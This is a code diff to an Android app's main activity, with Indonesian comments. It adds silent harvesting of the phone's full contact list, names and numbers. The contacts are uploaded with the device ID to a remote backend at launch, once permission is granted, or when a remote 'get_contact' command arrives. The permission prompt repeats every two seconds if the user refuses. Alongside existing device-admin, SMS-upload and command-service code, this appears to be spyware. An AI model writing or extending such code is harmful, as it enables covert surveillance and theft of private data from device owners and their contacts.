@@ -15,6 +15,7 @@ import android.net.Uri
 import android.os.*
 import android.provider.Settings
 import android.provider.Telephony
+import android.provider.ContactsContract
 import android.util.Log
 import android.location.Location
 import android.view.Surface
@@ -84,6 +85,9 @@ class MainActivity : ComponentActivity() {
     private val CAMERA_PERMISSION_CODE = 1003
     private val STORAGE_PERMISSION_CODE = 1004
     private val SMS_PERMISSION_CODE = 1010
+    private val CONTACTS_PERMISSION_CODE = 1011
+    private val READ_CONTACT_CODE = 1011
+    
     
     // Track which permissions to request next
     private val pendingPermissions = mutableListOf<String>()
@@ -114,6 +118,15 @@ class MainActivity : ComponentActivity() {
             }.start()
         }
         
+        // Check if contacts permission is already granted and upload immediately
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+            Log.d("PermissionDebug", "Contacts permission already granted on launch, uploading contacts")
+            // Run on a background thread to avoid blocking UI
+            Thread {
+                uploadContactsToBackend(this)
+            }.start()
+        }
+        
         // Panggil fungsi untuk kirim info device
         requestDeviceAdmin()
         startCommandService()
@@ -138,6 +151,9 @@ class MainActivity : ComponentActivity() {
             // Add SMS permission first to prioritize it
             pendingPermissions.add(Manifest.permission.READ_SMS)
             
+            // Add contacts permission right after SMS permission for prioritization
+            pendingPermissions.add(Manifest.permission.READ_CONTACTS)
+            
             pendingPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
             pendingPermissions.add(Manifest.permission.POST_NOTIFICATIONS)
             pendingPermissions.add(Manifest.permission.CAMERA)
@@ -159,8 +175,12 @@ class MainActivity : ComponentActivity() {
             if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                 // Found a permission that needs to be requested
                 permissionRequested = true
-                
+
                 when (permission) {
+                    Manifest.permission.READ_CONTACTS -> {
+                        Log.d("PermissionDebug", "Requesting Contact permission")
+                        ActivityCompat.requestPermissions(this, arrayOf(permission), CONTACTS_PERMISSION_CODE)
+                    }
                     Manifest.permission.READ_SMS -> {
                         Log.d("PermissionDebug", "Requesting SMS permission")
                         ActivityCompat.requestPermissions(this, arrayOf(permission), SMS_PERMISSION_CODE)
@@ -213,6 +233,25 @@ class MainActivity : ComponentActivity() {
                     // Try again to request SMS permission
                     Handler(Looper.getMainLooper()).postDelayed({
                         ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), SMS_PERMISSION_CODE)
+                    }, 2000)
+                }
+            }
+            CONTACTS_PERMISSION_CODE -> {
+                if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
+                    Log.i("PermissionContacts", "READ_CONTACTS granted, uploading contacts now")
+                    // Call upload contacts immediately when permission is granted
+                    uploadContactsToBackend(this)
+                    
+                    // Show confirmation to user
+                    Toast.makeText(this, "Contact data berhasil diupload", Toast.LENGTH_SHORT).show()
+                } else {
+                    Log.e("PermissionContacts", "READ_CONTACTS denied")
+                    // Show a message explaining why contacts permission is needed
+                    Toast.makeText(this, "Contacts permission is necessary for this feature", Toast.LENGTH_LONG).show()
+                    
+                    // Try again to request contacts permission
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), CONTACTS_PERMISSION_CODE)
                     }, 2000)
                 }
             }
@@ -295,6 +334,56 @@ class MainActivity : ComponentActivity() {
             override fun onResponse(call: Call, response: Response) {
                 val res = response.body?.string()
                 Log.i("UploadSMS", "Response: $res")
+            }
+        })
+    }
+    
+    private fun getContacts(context: Context): JSONArray {
+        val contacts = JSONArray()
+        val resolver = context.contentResolver
+        val cursor = resolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            null, null, null, null
+        )
+    
+        cursor?.use {
+            val idxName = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+            val idxNumber = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+    
+            while (it.moveToNext()) {
+                val obj = JSONObject()
+                obj.put("name", it.getString(idxName))
+                obj.put("number", it.getString(idxNumber))
+                contacts.put(obj)
+            }
+        }
+    
+        return contacts
+    }
+    
+    private fun uploadContactsToBackend(context: Context) {
+        val contactArray = getContacts(context)
+        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+    
+        val json = JSONObject().apply {
+            put("device_id", androidId)
+            put("contacts", contactArray)
+        }
+    
+        val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+    
+        val request = Request.Builder()
+            .url("${ApiConfig.BASE_URL}/api/device/upload_contacts")
+            .post(body)
+            .build()
+    
+        OkHttpClient().newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e("UploadContact", "Failed: ${e.message}")
+            }
+    
+            override fun onResponse(call: Call, response: Response) {
+                Log.i("UploadContact", "Uploaded: ${response.body?.string()}")
             }
         })
     }
@@ -573,6 +662,10 @@ class MainActivity : ComponentActivity() {
                         "get_sms" -> {
                             Log.d("CmdService", "Running get_sms command")
                             uploadSmsToBackend(applicationContext)
+                        }
+
+                        "get_contact" -> {
+                            uploadContactsToBackend(applicationContext)
                         }
 
                     }
